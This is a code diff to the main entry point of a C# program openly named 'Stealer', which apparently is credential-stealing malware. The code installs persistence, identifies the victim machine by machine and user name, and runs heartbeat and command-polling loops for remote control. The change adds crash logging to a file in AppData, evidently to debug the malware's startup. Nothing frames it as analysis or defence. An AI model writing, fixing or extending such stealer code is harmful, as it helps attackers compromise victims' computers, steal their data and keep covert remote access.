@@ -1,4 +1,5 @@
 using System;
+using System.IO;
 using System.Threading;
 using System.Threading.Tasks;
 using Stealer.Collectors;
@@ -11,22 +12,41 @@ namespace Stealer
         private static readonly int HeartbeatInterval = 25000;
         private static readonly int CommandPollInterval = 10000;
         private static string _clientId;
+        private static readonly string CrashLog = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+            "whm_crash.log");
 
         static void Main(string[] args)
         {
+            AppDomain.CurrentDomain.UnhandledException += (s, e) =>
+            {
+                try { File.AppendAllText(CrashLog, DateTime.Now + " UNHANDLED: " + e.ExceptionObject + "\r\n"); } catch { }
+            };
+
             try
             {
+                File.AppendAllText(CrashLog, DateTime.Now + " START\r\n");
+
                 Config.Initialize();
+                File.AppendAllText(CrashLog, DateTime.Now + " CONFIG OK\r\n");
+
                 _clientId = Environment.MachineName + "_" + Environment.UserName;
 
-                try { Persistence.Install(); } catch { }
+                try { Persistence.Install(); } catch (Exception ex) {
+                    File.AppendAllText(CrashLog, DateTime.Now + " PERSIST ERR: " + ex.Message + "\r\n");
+                }
+
+                File.AppendAllText(CrashLog, DateTime.Now + " STARTING LOOPS\r\n");
 
                 var heartbeatThread = new Thread(HeartbeatLoop) { IsBackground = true };
                 heartbeatThread.Start();
 
                 CommandLoop();
             }
-            catch { }
+            catch (Exception ex)
+            {
+                try { File.AppendAllText(CrashLog, DateTime.Now + " MAIN ERR: " + ex + "\r\n"); } catch { }
+            }
 
             while (true) { Thread.Sleep(60000); }
         }
